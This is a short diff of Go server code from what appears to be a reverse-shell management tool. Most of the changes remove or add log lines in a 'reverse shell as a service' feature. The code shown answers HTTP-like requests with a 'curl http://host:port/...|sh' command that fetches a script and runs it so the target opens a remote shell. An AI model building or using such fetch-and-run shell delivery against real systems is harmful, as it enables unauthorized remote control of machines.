@@ -54,7 +54,6 @@ func (s *TCPServer) Run() {
 		}
 		client := CreateTCPClient(conn)
 		log.Info("New client %s Connected", client.Desc())
-		log.Info("Checking service")
 		// Reverse shell as a service
 		buffer := make([]byte, 4)
 		client.Conn.SetReadDeadline(time.Now().Add(time.Second * 3))
@@ -66,15 +65,12 @@ func (s *TCPServer) Run() {
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				log.Error("Not requesting for service")
 			} else {
-				log.Error("Read from client failed")
 				client.Interactive = false
 				Ctx.DeleteTCPClient(client)
 			}
 		}
-		log.Info("%d bytes read from client: %s", n, buffer[:n])
 		if string(buffer[:n]) == "GET " {
 			requestURI := client.ReadUntilClean(" ")
-			log.Info("Request URI: %s", requestURI)
 			var command string = fmt.Sprintf(
 				"curl http://%s:%d/%s/%d|sh",
 				s.Host,
@@ -99,7 +95,7 @@ func (s *TCPServer) Run() {
 			client.Write([]byte("\r\n"))
 			client.Write([]byte(command))
 			Ctx.DeleteTCPClient(client)
-
+			log.Info("RaaS: %s", command)
 		} else {
 			s.AddTCPClient(client)
 		}
